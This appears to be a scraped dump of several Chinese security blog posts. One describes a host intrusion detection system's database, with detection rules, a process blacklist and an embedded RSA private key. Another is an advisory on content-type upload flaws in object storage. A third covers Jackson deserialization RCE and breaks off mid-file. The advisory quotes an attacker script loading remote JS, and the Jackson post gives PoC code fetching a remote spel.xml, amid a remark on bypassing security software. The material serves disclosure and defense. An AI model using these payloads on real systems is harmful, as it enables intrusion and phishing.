loginlog AWKodaW5ZT0_Kn0N9YOy 1 192.168.1.1 0 true Administrator 2018-02-17T18:37:44+07:00 monitor2018_04 connection AWKpDlutZT0_Kn0N9Ydd 1 192.168.1.1 182.118.40.31 2018-04-09T14:18:06+08:00 out 192.168.1.1:54080 LiveUpdate360.exe 3524 tcp monitor2018_04 file AWKo3gdkZT0_Kn0N9Ycu 1 192.168.1.1 2018-04-09T13:25:21+08:00 WRITE 899a5bf1669610cdb78d322ac8d9358b c:\\windows\\sysnative\\Packet.dll Administrators monitor2018_04 process AWKzeH6oZT0_Kn0N9Y0x 1 192.168.1.1 2018-04-11T14:49:43+08:00 cmd.exe 2380 sqlservr.exe 1392 五、MongoDB数据库123456789&gt;show collectionsclientconfigfileinfonoticerulesserverstatistics 字段数据举例： client： 1234567db.client.find() &quot;_id&quot; : ObjectId(&quot;5acf4cde5e2ba50ef19a6347&quot;), &quot;ip&quot; : &quot;192.168.1.2&quot;, &quot;hostname&quot; : &quot;bbbbbbbbbbbbbbb&quot;, &quot;path&quot; : [ ], &quot;system&quot; : &quot;Windows Server 2008 R2 Enterprise 64&quot;, &quot;type&quot; : &quot;db&quot;, &quot;uptime&quot; : ISODate(&quot;2018-04-12T12:15:10.475Z&quot;), &quot;health&quot; : 1 &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5acf4dec5e2ba50ef1b547f9&quot;), &quot;ip&quot; : &quot;192.168.1.3&quot;, &quot;hostname&quot; : &quot;bbbbbbbbbbbbbbb&quot;, &quot;path&quot; : [ ], &quot;system&quot; : &quot;Windows Server 2008 R2 Enterprise 64&quot;, &quot;type&quot; : &quot;db&quot;, &quot;uptime&quot; : ISODate(&quot;2018-04-13T10:29:36.636Z&quot;), &quot;health&quot; : 2 &#125;0健康 1离线 2存在防火墙阻拦 config： 12345678910db.config.find()&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e1a25e2ba50ef1a758e2&quot;), &quot;type&quot; : &quot;client&quot;, &quot;dic&quot; : &#123; &quot;cycle&quot; : 2, &quot;udp&quot; : false, &quot;lan&quot; : false, &quot;monitorPath&quot; : [ &quot;%windows%&quot;, &quot;%system32%&quot;, &quot;%web%&quot;, &quot;/etc/&quot;, &quot;/bin/&quot;, &quot;/sbin/&quot;, &quot;/usr/bin/&quot;, &quot;/usr/sbin/&quot; ] &#125; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e1a25e2ba50ef1a758e3&quot;), &quot;type&quot; : &quot;server&quot;, &quot;dic&quot; : &#123; &quot;publickey&quot; : &quot;-----BEGIN PUBLIC KEY-----\\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDJcyrbTRmezc++tR1ZF4R0LktE\\nNye/MHY07CE229av69YnJuUtYnEWc1471mDhaJmL8kAb+46Bt7y7L53H2t4VuMTd\\nQfghZ/QAyKWsumupZhll0clh3bbROKHfJbNYSydmT+M9GbLygGeH1zLpSL8Qx9to\\n4eVPhcIUMhjGGxbpqwIDAQAB\\n-----END PUBLIC KEY-----\\n&quot;, &quot;privatekey&quot; : &quot;-----BEGIN RSA PRIVATE KEY-----\\nMIICXgIBAAKBgQDJcyrbTRmezc++tR1ZF4R0LktENye/MHY07CE229av69YnJuUt\\nYnEWc1471mDhaJmL8kAb+46Bt7y7L53H2t4VuMTdQfghZ/QAyKWsumupZhll0clh\\n3bbROKHfJbNYSydmT+M9GbLygGeH1zLpSL8Qx9to4eVPhcIUMhjGGxbpqwIDAQAB\\nAoGBAImFMFWDHaFWOKKku0MtlcNGMyV/TYfsClX4eHgdvUJdCdWybLL9x9ueqE7K\\n+1oFcQSjPHad1Nvi1VknmVtsozwTAMWoRq1J1NLVK4nxKpB4G1WRw7lQPLTLwmkZ\\n3MuvNHQpFKtUGgAnv8bOer2ijDpkg72FCU140ETapTGHVmfBAkEA/TMb8vgwhYK8\\nnu/telcL8BStGbp+pS0T84Zcg4kdlznsQHXPnpueSQvsJmXeSW9zaDf/cQUMJFvT\\nHzfbNgLSIQJBAMutiak/F6A1caFuS3uiDLwBnFBjvWR16YKonhSomSbE2RP4xPMm\\nXXhjv1xPtLfav1Rx95txjiZyREjJNzlsGksCQQDZOhoGcAwg3zM4IJvbVAb36KVB\\n55Bz4aK2UVXZu69ZaOZZvzlq2BQKk2H853S4CBg5F6Hdsvjh0K3moKM/SVhBAkBo\\nOjDk9A1iBZdVdbyY0s9TcjuMg83KV/Cb1S+4AKMGzNsNNlOK3goc7mZhlcQ0BXO9\\ngeikmhKVKAo7eQSSlPhLAkEApEHlFSWjbedA9RgHuUa/BeX6htRoghfOfS34Ebqg\\ntuxp35YdsLs6iDl7zf1ZQuUvUsTPhXnSzP2Yti0/dI7Ejg==\\n-----END RSA PRIVATE KEY-----\\n&quot;, &quot;cert&quot; : &quot;-----BEGIN CERTIFICATE-----\\nMIICEDCCAXmgAwIBAgIJANcVcODaSbzPMA0GCSqGSIb3DQEBBQUAMCExHzAdBgNV\\nBAMMFmRvbWFpbi1zZWMtcHJvamVjdC5jb20wHhcNMTgwNDA4MDkzNjM3WhcNMjgw\\nNDA1MDkzNjM3WjAhMR8wHQYDVQQDDBZkb21haW4tc2VjLXByb2plY3QuY29tMIGf\\nMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDJcyrbTRmezc++tR1ZF4R0LktENye/\\nMHY07CE229av69YnJuUtYnEWc1471mDhaJmL8kAb+46Bt7y7L53H2t4VuMTdQfgh\\nZ/QAyKWsumupZhll0clh3bbROKHfJbNYSydmT+M9GbLygGeH1zLpSL8Qx9to4eVP\\nhcIUMhjGGxbpqwIDAQABo1AwTjAdBgNVHQ4EFgQUZwP3xxBKYkhKUFyxt4ZoktDU\\ne0YwHwYDVR0jBBgwFoAUZwP3xxBKYkhKUFyxt4ZoktDUe0YwDAYDVR0TBAUwAwEB\\n/zANBgkqhkiG9w0BAQUFAAOBgQATrutSnvbPTqrPv+19DQZSSSTWQoyaddPT3Q5i\\nvyqerVrozRfgHbxKspZZIyJL04BQtCLj+85yIIRfgTbWozy5pwimjJYd8NB72PUr\\n8mirgWqewMLe1mhWmS8IXOJfzFhB9azlj5sly47JunLnbKlaVqU+ZtjUiq7jKw4p\\nlpBftw==\\n-----END CERTIFICATE-----\\n&quot;, &quot;learn&quot; : false, &quot;offlinecheck&quot; : false &#125; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e1a25e2ba50ef1a758e4&quot;), &quot;type&quot; : &quot;intelligence&quot;, &quot;dic&quot; : &#123; &quot;switch&quot; : false, &quot;ipapi&quot; : &quot;http://127.0.0.1/api/?ip=&#123;$ip&#125;&quot;, &quot;fileapi&quot; : &quot;http://127.0.0.1/api/?hash=&#123;$hash&#125;&quot;, &quot;regex&quot; : &quot;black&quot; &#125; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e1a25e2ba50ef1a758e5&quot;), &quot;dic&quot; : &#123; &quot;switch&quot; : false, &quot;onlyhigh&quot; : false, &quot;api&quot;: &quot;http://127.0.0.1/test/?text=&#123;$info&#125;&quot; &#125;, &quot;type&quot; : &quot;notice&quot; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e1a25e2ba50ef1a758e6&quot;), &quot;dic&quot; : &#123; &quot;file&quot; : [ ], &quot;ip&quot; : [ ], &quot;process&quot; : [ ], &quot;other&quot; : [ ] &#125;, &quot;type&quot; : &quot;whitelist&quot; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e1a25e2ba50ef1a758e7&quot;), &quot;type&quot; : &quot;blacklist&quot;, &quot;dic&quot; : &#123; &quot;process&quot; : [ &quot;mssecsvc\\\\.exe&quot;, &quot;tasksche\\\\.exe&quot; ], &quot;other&quot; : [ ], &quot;file&quot; : [ ], &quot;ip&quot; : [ ] &#125; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e1a25e2ba50ef1a758e8&quot;), &quot;type&quot; : &quot;filter&quot;, &quot;dic&quot; : &#123; &quot;file&quot; : [ &quot;^c:\\\\\\\\windows\\\\\\\\temp$&quot;, &quot;\\\\.(png|js|css|jpg|gif|wolff|svg)$&quot; ], &quot;ip&quot; : [ ], &quot;process&quot; : [ &quot;c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\wbem\\\\\\\\wmiprvse.exe&quot; ] &#125; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e1a25e2ba50ef1a758e9&quot;), &quot;type&quot; : &quot;web&quot;, &quot;dic&quot; : &#123; &quot;tfakey&quot; : &quot;&quot; &#125; &#125; file: 12345678910&gt; db.file.find()&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e22c5e2ba50ef1a7591f&quot;), &quot;platform&quot; : &quot;64&quot;, &quot;system&quot; : &quot;linux&quot;, &quot;type&quot; : &quot;agent&quot;, &quot;hash&quot; : &quot;08e2a1144e4191e375cb03fcd5e7a7c3&quot;, &quot;uptime&quot; : ISODate(&quot;2018-04-08T09:34:36.178Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e22c5e2ba50ef1a75922&quot;), &quot;platform&quot; : &quot;64&quot;, &quot;system&quot; : &quot;linux&quot;, &quot;type&quot; : &quot;daemon&quot;, &quot;hash&quot; : &quot;5b1ddf0f8ee2fc9c170be29462cdcc54&quot;, &quot;uptime&quot; : ISODate(&quot;2018-04-08T09:34:36.218Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e22c5e2ba50ef1a75925&quot;), &quot;platform&quot; : &quot;64&quot;, &quot;system&quot; : &quot;linux&quot;, &quot;type&quot; : &quot;data&quot;, &quot;hash&quot; : &quot;ec777b4a79f32254f5a8dae10cf029b2&quot;, &quot;uptime&quot; : ISODate(&quot;2018-04-08T09:34:36.222Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e2305e2ba50ef1a7592c&quot;), &quot;platform&quot; : &quot;32&quot;, &quot;system&quot; : &quot;windows&quot;, &quot;type&quot; : &quot;agent&quot;, &quot;hash&quot; : &quot;536f05fd939ae563fbdd7e52a3d7e132&quot;, &quot;uptime&quot; : ISODate(&quot;2018-04-08T09:34:40.776Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e2305e2ba50ef1a7592f&quot;), &quot;platform&quot; : &quot;32&quot;, &quot;system&quot; : &quot;windows&quot;, &quot;type&quot; : &quot;daemon&quot;, &quot;hash&quot; : &quot;37e3593a084dff5e2bce85dd4815cf8e&quot;, &quot;uptime&quot; : ISODate(&quot;2018-04-08T09:34:40.792Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e2305e2ba50ef1a75932&quot;), &quot;platform&quot; : &quot;32&quot;, &quot;system&quot; : &quot;windows&quot;, &quot;type&quot; : &quot;data&quot;, &quot;hash&quot; : &quot;ce04138b9f0336f5c30297d34b44b63a&quot;, &quot;uptime&quot; : ISODate(&quot;2018-04-08T09:34:40.793Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e2305e2ba50ef1a75938&quot;), &quot;platform&quot; : &quot;64&quot;, &quot;system&quot; : &quot;windows&quot;, &quot;type&quot; : &quot;agent&quot;, &quot;hash&quot; : &quot;536f05fd939ae563fbdd7e52a3d7e132&quot;, &quot;uptime&quot; : ISODate(&quot;2018-04-08T09:34:40.935Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e2305e2ba50ef1a7593b&quot;), &quot;platform&quot; : &quot;64&quot;, &quot;system&quot; : &quot;windows&quot;, &quot;type&quot; : &quot;daemon&quot;, &quot;hash&quot; : &quot;37e3593a084dff5e2bce85dd4815cf8e&quot;, &quot;uptime&quot; : ISODate(&quot;2018-04-08T09:34:40.951Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5ac9e2305e2ba50ef1a7593e&quot;), &quot;platform&quot; : &quot;64&quot;, &quot;system&quot; : &quot;windows&quot;, &quot;type&quot; : &quot;data&quot;, &quot;hash&quot; : &quot;00af5f5a51df34a942d44cf9641ad368&quot;, &quot;uptime&quot; : ISODate(&quot;2018-04-08T09:34:40.953Z&quot;) &#125; info: 1234567891011121314151617181920212223242526272829303132333435&gt; db.info.findOne()&#123;&quot;_id&quot; : ObjectId(&quot;5aca09915e2ba50ef1ac00a7&quot;),&quot;ip&quot; : &quot;192.168.1.4&quot;,&quot;type&quot; : &quot;userlist&quot;,&quot;system&quot; : &quot;linux&quot;,&quot;data&quot; : [&#123;&quot;name&quot; : &quot;root&quot;,&quot;description&quot; : &quot;x:0:0:root:/root:/bin/bash&quot;&#125;,&#123;&quot;description&quot; : &quot;x:5:0:sync:/sbin:/bin/sync&quot;,&quot;name&quot; : &quot;sync&quot;&#125;,&#123;&quot;name&quot; : &quot;shutdown&quot;,&quot;description&quot; : &quot;x:6:0:shutdown:/sbin:/sbin/shutdown&quot;&#125;,&#123;&quot;description&quot; : &quot;x:7:0:halt:/sbin:/sbin/halt&quot;,&quot;name&quot; : &quot;halt&quot;&#125;,&#123;&quot;description&quot; : &quot;x:500:500::/home/niubi:/bin/bash&quot;,&quot;name&quot; : &quot;niubi&quot;&#125;,&#123;&quot;name&quot; : &quot;papapa&quot;,&quot;description&quot; : &quot;x:550:550::/home/papapa:/bin/bash&quot;&#125;],&quot;uptime&quot; : ISODate(&quot;2018-04-09T09:05:48.640Z&quot;)&#125;&gt; notice： 123456789101112&gt; db.notice.findOne()&#123;&quot;_id&quot; : ObjectId(&quot;5aca09915e2ba50ef1ac00ee&quot;),&quot;description&quot; : &quot;企业网络中首次出现的linux可登陆用户&quot;,&quot;info&quot; : &quot;root|x:0:0:root:/root:/bin/bash&quot;,&quot;ip&quot; : &quot;192.168.1.4&quot;,&quot;level&quot; : 1,&quot;source&quot; : &quot;可疑用户&quot;,&quot;status&quot; : 4,&quot;time&quot; : ISODate(&quot;2018-04-08T12:22:41.864Z&quot;),&quot;type&quot; : &quot;userlist&quot;&#125; rules： 1234567891011121314151617181920212223&#123;&quot;_id&quot; : ObjectId(&quot;5ac9e1de5e2ba50ef1a758f8&quot;),&quot;enabled&quot; : true,&quot;meta&quot; : &#123;&quot;description&quot; : &quot;web进程执行了系统命令，可能为命令执行漏洞或者webshell行为&quot;,&quot;level&quot; : 0,&quot;name&quot; : &quot;WebServer可疑进程启动(windows)&quot;,&quot;author&quot; : &quot;wolf&quot;&#125;,&quot;rules&quot; : &#123;&quot;name&quot; : &#123;&quot;data&quot; : &quot;^(cmd\\\\.exe|powershell\\\\.exe)$&quot;,&quot;type&quot; : &quot;regex&quot;&#125;,&quot;parentname&quot; : &#123;&quot;data&quot; : &quot;^(w3wp\\\\.exe|httpd\\\\.exe|nginx\\\\.exe|php-cgi\\\\.exe)$&quot;,&quot;type&quot; : &quot;regex&quot;&#125;&#125;,&quot;source&quot; : &quot;process&quot;,&quot;system&quot; : &quot;windows&quot;,&quot;and&quot; : true&#125; server： 12345&#123;&quot;_id&quot; : ObjectId(&quot;5aca096d5e2ba50ef1a75c5c&quot;),&quot;netloc&quot; : &quot;192.168.1.5:33433&quot;,&quot;uptime&quot; : ISODate(&quot;2018-04-13T12:47:34.678Z&quot;)&#125; statistics: 123456789101112131415161718192021222324252627282930313233343536373839404142&#123; &quot;_id&quot; : ObjectId(&quot;5aca09915e2ba50ef1ac00ab&quot;), &quot;uptime&quot; : ISODate(&quot;2018-04-11T12:35:13.782Z&quot;), &quot;type&quot; : &quot;loginlog&quot;, &quot;info&quot; : &quot;192.168.1.6&quot;, &quot;count&quot; : 30, &quot;server_list&quot; : [ &quot;192.168.1.4&quot;, &quot;192.168.1.5&quot; ]&#125;&#123; &quot;_id&quot; : ObjectId(&quot;5aca09915e2ba50ef1ac00b8&quot;), &quot;type&quot; : &quot;loginlog&quot;, &quot;info&quot; : &quot;192.168.1.7&quot;, &quot;count&quot; :12, &quot;server_list&quot; : [ &quot;192.168.1.4&quot;, &quot;192.168.1.5&quot; ], &quot;uptime&quot; : ISODate(&quot;2018-04-09T09:05:48.640Z&quot;)&#125;&#123; &quot;_id&quot; : ObjectId(&quot;5aca09915e2ba50ef1ac00b4&quot;), &quot;type&quot; : &quot;userlist&quot;, &quot;info&quot; : &quot;root&quot;, &quot;count&quot; : 4, &quot;server_list&quot; : [ &quot;192.168.1.4&quot;, &quot;192.168.1.5&quot; ], &quot;uptime&quot; : ISODate(&quot;2018-04-09T09:05:48.640Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5acf1f5e5e2ba50ef1fb4e28&quot;), &quot;type&quot; : &quot;userlist&quot;, &quot;info&quot; : &quot;piasdf$&quot;, &quot;count&quot; : 7,&quot;server_list&quot; : [ &quot;192.168.1.1&quot;, &quot;192.168.1.2&quot;, &quot;192.168.1.3&quot; ], &quot;uptime&quot; : ISODate(&quot;2018-04-12T12:35:53.264Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5aca09915e2ba50ef1ac00b6&quot;), &quot;info&quot; : &quot;0.0.0.0:5266&quot;, &quot;count&quot; : 7, &quot;server_list&quot; :[ &quot;192.168.1.4&quot;, &quot;192.168.1.5&quot; ], &quot;uptime&quot; : ISODate(&quot;2018-04-12T18:21:44.314Z&quot;), &quot;type&quot; : &quot;listening&quot; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5aca0bc25e2ba50ef1e3542a&quot;), &quot;type&quot; : &quot;listening&quot;, &quot;info&quot; : &quot;0.0.0.0:443&quot;, &quot;count&quot;: 4, &quot;server_list&quot; : [ &quot;192.168.1.5&quot; ], &quot;uptime&quot; : ISODate(&quot;2018-04-12T18:21:44.314Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5aca0bc25e2ba50ef1e353e0&quot;), &quot;type&quot; : &quot;crontab&quot;, &quot;info&quot; : &quot;/usr/bin/test -f /tmp/lockfile &gt;/dev/null || /opt/apple/apps/ddd/tool 2 &gt;/dev/null &amp;&amp; /bin/touch /tmp/lock&quot;, &quot;count&quot; : 1, &quot;server_list&quot; : [ &quot;192.168.1.5&quot; ], &quot;uptime&quot; : ISODate(&quot;2018-04-08T12:32:02.633Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5acadea05e2ba50ef1a55877&quot;), &quot;type&quot; : &quot;crontab&quot;, &quot;info&quot; : &quot;c:\\\\windows\\\\syswow64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe&quot;, &quot;count&quot; : 16, &quot;server_list&quot; : [ &quot;192.168.1.1&quot;, &quot;192.168.1.2&quot;, &quot;192.168.1.3&quot; ], &quot;uptime&quot; : ISODate(&quot;2018-04-12T12:35:53.233Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5acadea95e2ba50ef1a630c8&quot;), &quot;type&quot; : &quot;connection&quot;, &quot;info&quot; : &quot;111.206.79.165&quot;, &quot;count&quot; : 4987, &quot;server_list&quot; : [ &quot;192.168.1.1&quot; ], &quot;uptime&quot; : ISODate(&quot;2018-04-11T12:53:15.086Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5acae3135e2ba50ef11946e6&quot;), &quot;type&quot; : &quot;connection&quot;, &quot;info&quot; : &quot;123.125.80.36&quot;, &quot;count&quot; : 1, &quot;server_list&quot; : [ &quot;192.168.1.1&quot; ], &quot;uptime&quot; : ISODate(&quot;2018-04-09T03:50:43.619Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5acf23575e2ba50ef16296eb&quot;), &quot;type&quot; : &quot;process&quot;, &quot;info&quot; : &quot;w3wp.exe&quot;, &quot;count&quot; : 6,&quot;server_list&quot; : [ &quot;192.168.1.1&quot;, &quot;192.168.1.2&quot;, &quot;192.168.1.3&quot; ], &quot;uptime&quot; : ISODate(&quot;2018-04-13T12:43:03.017Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5acf32385e2ba50ef1e5ee42&quot;), &quot;info&quot; : &quot;HipsMain.exe&quot;, &quot;count&quot; : 3, &quot;server_list&quot; :[ &quot;192.168.1.1&quot;, &quot;192.168.1.3&quot; ], &quot;uptime&quot; : ISODate(&quot;2018-04-12T12:39:49.601Z&quot;), &quot;type&quot; : &quot;process&quot; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5acadea05e2ba50ef1a5587a&quot;), &quot;uptime&quot; : ISODate(&quot;2018-04-12T12:35:53.232Z&quot;), &quot;type&quot; : &quot;startup&quot;, &quot;info&quot; : &quot;360sd&quot;, &quot;count&quot; : 18, &quot;server_list&quot; : [ &quot;192.168.1.1&quot;, &quot;192.168.1.2&quot;, &quot;192.168.1.3&quot; ] &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5acadea05e2ba50ef1a55886&quot;), &quot;count&quot; : 18, &quot;server_list&quot; : [ &quot;192.168.1.1&quot;, &quot;192.168.1.2&quot;, &quot;192.168.1.3&quot; ], &quot;uptime&quot; : ISODate(&quot;2018-04-12T12:35:53.232Z&quot;), &quot;type&quot; : &quot;startup&quot;, &quot;info&quot; : &quot;AnyDesk&quot; &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5acae2665e2ba50ef107caa7&quot;), &quot;type&quot; : &quot;service&quot;, &quot;info&quot; : &quot;hidserv&quot;, &quot;count&quot; : 114, &quot;server_list&quot; : [ &quot;192.168.1.1&quot;, &quot;192.168.1.2&quot;, &quot;192.168.1.3&quot; ], &quot;uptime&quot; : ISODate(&quot;2018-04-13T11:41:20.587Z&quot;) &#125;&#123; &quot;_id&quot; : ObjectId(&quot;5acae2665e2ba50ef107cbe7&quot;), &quot;type&quot; : &quot;service&quot;, &quot;info&quot; : &quot;SQLBrowser&quot;, &quot;count&quot; : 114, &quot;server_list&quot; : [ &quot;192.168.1.1&quot;, &quot;192.168.1.2&quot;, &quot;192.168.1.3&quot; ], &quot;uptime&quot; : ISODate(&quot;2018-04-13T11:41:20.587Z&quot;) &#125; 六、入侵检测功能点和维度 [server]-&gt;ScanMonitorThread(安全检测线程)-&gt;Run(开始检测)-&gt;BlackFilter(黑名单)-&gt;WhiteFilter(白名单)-&gt;Rules(规则引擎)-&gt;Intelligence(威胁情报) 1. webshell写入行为Linux目前支持Apache和nginx的目录自动监控： apachectl -V nginx -V Windows目前支持IIS6和IIS7： 先在初始化时获取进程列表存库，如果获取到web进程，并web标签入库，则收集web目录，并进行监控： x32iis6配置文件:%SystemDrive%\\WINDOWS\\SysNative\\inetsrv\\MetaBase.xmliis7配置文件:%SystemDrive%\\Windows\\SysNative\\inetsrv\\config\\applicationHost.config x64iis6配置文件:%SystemDrive%\\WINDOWS\\System32\\inetsrv\\MetaBase.xmliis7配置文件:%SystemDrive%\\Windows\\System32\\inetsrv\\config\\applicationHost.config 识别模式：1）文件监控，通过监控文件WRITE行为，正则匹配文件的后缀类型为黑名单中的后缀进行匹配。bypass 中文.aspx2）进程监控，父进程是web服务，执行子进程是黑名单进程中的进程名字或命令。 2.异常登录、网络连接行为统计第n次出现的登录ip、登录用户名告警，原则上MongoDB的statistics表里loginlog（登录的ip）、userlist（登录的用户）、listening（ip监听端口）、crontab（计划任务）、process（进程名字）、startup（启动项名字）、service（服务名字）都存在count字段，都可以通过自定义规则进行告警。 识别模式：1）进程监控 2）文件监控，登录日志windows《驭龙 EventLog 读取模块的迭代历程》，Linux 登录成功（解析/var/log/wtmp）、登录失败lastb命令； 3）网络流量 3.异常命令调用行为《Linux System Calls Hooking Method Summary》、《如何在Linux下监控命令执行》、《「驭龙」Linux执行命令监控驱动实现解析》 在驭龙hids官方git上的演示sql注入和命令执行，实际上跟我们平时理解的waf有所区别，没有对web请求进行监控。而是通过规则定义了sqlsrver.exe启动子进程为cmd.exe的调用关系，而在sqlserver上通过xp_cmdshell执行命令就是通过cmd间接执行其他命令的。 在3gstudent和evi1cg.me的博客上有关于win下文件下载\b、命令执行和sqlserver执行命令的一些姿势，如果理清楚进程的调用关系，相信你一定可以绕过某些安全软件的动作拦截，包括msf的payload去开shell等。 识别模式：1）进程监控，通过规则定义进程调用关系进行告警 小结没有小结~","tags":[{"name":"安全建设","slug":"安全建设","permalink":"http://pirogue.org/tags/安全建设/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://pirogue.org/tags/渗透测试/"},{"name":"hids","slug":"hids","permalink":"http://pirogue.org/tags/hids/"},{"name":"驭龙hids","slug":"驭龙hids","permalink":"http://pirogue.org/tags/驭龙hids/"},{"name":"安全开发","slug":"安全开发","permalink":"http://pirogue.org/tags/安全开发/"}]},{"title":"OSS对象存储上传解析漏洞预警","date":"2018-02-27T15:30:26.000Z","path":"2018/02/27/oss_upload_vul/","text":"事件背景安全研究员在近期发现网络上频繁发生国内大型互联网厂商上传图片后解析成html、js页面，被黑产人员用作钓鱼攻击。 攻击案例酷狗钓鱼链接：http://userphoto.bssdl.kugou.com/70296bbe6e02223af1cfb952b2eefcb3.jpg#1519721124069 实际上攻击者上传了一个内容为&lt;script src=//55555.gz.bcebos.com/mjk.js?111&gt;&lt;/script&gt;的后缀为jpg的文件，当用户打开原本是图片的网址，会被浏览器渲染成js最终的展示效果，包括一些列的鼠标事件和跳转。 漏洞分析网易对象存储中提到“文件的 MIME，定义文件的类型及网页编码，决定浏览器将以什么形式、什么编码读取文件。如果用户没有指定则根据 Key 或文件名的扩展名生成，如果没有扩展名则填默认值” 以163站点为例http://new.hi.163.com/#/setting/step1 ，163新闻讨论站点上传头像地址。 攻击步骤： 0x01: 无论我们上传什么类型后缀的文件，只要截获上传数据包，将content-type类型修改为“text/html”： 0x02: 打开上传后的文件地址：http://hi-163-common.nosdn.127.net/upload/201802/27/6efee9301baa11e89a72a5fc87cb5892 发现content-type为我们上传时设置的text/html，发现原本的图片，已经把内容当做html进行渲染。 攻击者可通过自定义上传content-type类型，进行xss或者钓鱼攻击。 修复方案业务研发方：在使用对象存储时，根据业务需要在服务端先校验文件后缀类型，再校验Content-Type是否属与此后缀类型相匹配；云储存方：文件后缀类型与文件MIME强关联，一一对应，例如禁止jpeg后缀的文件MIME变成text/html。 写在最后&nbsp;&nbsp;&nbsp;&nbsp;在几个月前我就在博客中有写到一篇《阿里云OSS约等于文件上传漏洞？》的文章，其中就提到了任意文件上传导致xss漏洞，当时只是发现了现象，并没有对oss云存储的形成漏洞的原因进一步测试总结。&nbsp;&nbsp;&nbsp;&nbsp;现在来看除了用户使用上要严格校验上传文件类型外，OSS文件存储是否也应该在设计上避免“因用户默认不在后端校验文件MIME类型”导致的安全隐患呢？","tags":[{"name":"OSS对象存储","slug":"OSS对象存储","permalink":"http://pirogue.org/tags/OSS对象存储/"},{"name":"上传漏洞","slug":"上传漏洞","permalink":"http://pirogue.org/tags/上传漏洞/"},{"name":"解析漏洞","slug":"解析漏洞","permalink":"http://pirogue.org/tags/解析漏洞/"},{"name":"漏洞预警","slug":"漏洞预警","permalink":"http://pirogue.org/tags/漏洞预警/"}]},{"title":"Jackson反序列化远程代码执行漏洞","date":"2018-01-12T15:57:20.000Z","path":"2018/01/12/jackson-databind-rce/","text":"Jackson漏洞历史(CVE-2017-7525)北京时间2017年4月15日，Jackson框架被发现存在一个反序列化代码执行漏洞。该漏洞存在于Jackson框架下的enableDefaultTyping方法，通过该漏洞，攻击者可以远程在服务器主机上越权执行任意代码，从而取得该网站服务器的控制权。 Jackson是一个开源的Java序列化与反序列化工具，可以将java对象序列化为xml或json格式的字符串，或者反序列化回对应的对象，由于其使用简单，速度较快，且不依靠除JDK外的其他库，被众多用户所使用。 关于历史漏洞的分析可以参考，绿盟科技在17年发表的技术分析文章：http://blog.nsfocus.net/jackson-framework-java-vulnerability-analysis/ 漏洞触发链getOutputProperties()-&gt;newTransFormer()→newInstance() 构造方式通过java生态中的第三方库存在的序列化方法构造序列化恶意攻击代码，并将恶意代码base64编码后拼接到一个精心构造的json数据包中，代码层如果在使用ObjectMapper对象实例时（ObjectMapper mapper = new ObjectMapper();）开启了enableDefaultType特性（例如mapper.enableDefaultTyping();），会在readValue时对传入的JSON自动调用第三方库的反序列化方法，造成代码执行。 官方修复方式官方在漏洞产生后，通过黑名单的方式禁止黑名单中的第三方库因为反序列化问题而产生的代码执行漏洞。 黑名单如下： 12345678org.apache.commons.collections.functors.InvokerTransformerorg.apache.commons.collections.functors.InstantiateTransformerorg.apache.commons.collections4.functors.InvokerTransformerorg.apache.commons.collections4.functors.InstantiateTransformerorg.codehaus.groovy.runtime.ConvertedClosureorg.codehaus.groovy.runtime.MethodClosureorg.springframework.beans.factory.ObjectFactorycom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 新漏洞的产生(CVE-2017-17485)众所周知黑名单是一种不可靠的修复方式，攻击者常常可以通过一些手段绕过黑名单，造成漏洞影响。 安全研究人员发现，在开启enableDefaultTyping()的前提下可以通过Jackson-databind来滥用Spring spel来执行任意命令。 POC关于Jackson-databind漏洞所有的poc验证代码：https://github.com/shengqi158/Jackson-databind-RCE-PoC Code by 廖新喜 其中CVE-2017-17485的验证代码：1234567891011121314151617181920212223242526272829package jackson; import com.fasterxml.jackson.databind.ObjectMapper;import java.io.IOException;import java.lang.reflect.Array; /** * Created by liaoxinxi on 2017-12-11. */ public class TestJdbcRowSetImplPoc &#123; public static void main(String args[])&#123; testSpringFramework(); &#125; public static void testSpringFramework()&#123; //CVE-2017-17485 // 假设这是攻击者可以控制的请求包payload String payload = \"[\\\"org.springframework.context.support.ClassPathXmlApplicationContext\\\", \" + \"\\\"http://188.51.32.233/spel.xml\\\"]\\n\"; ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); try &#123; mapper.readValue(payload, Object.class); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; spel.xml文件内容： 1234567891011&lt;beans 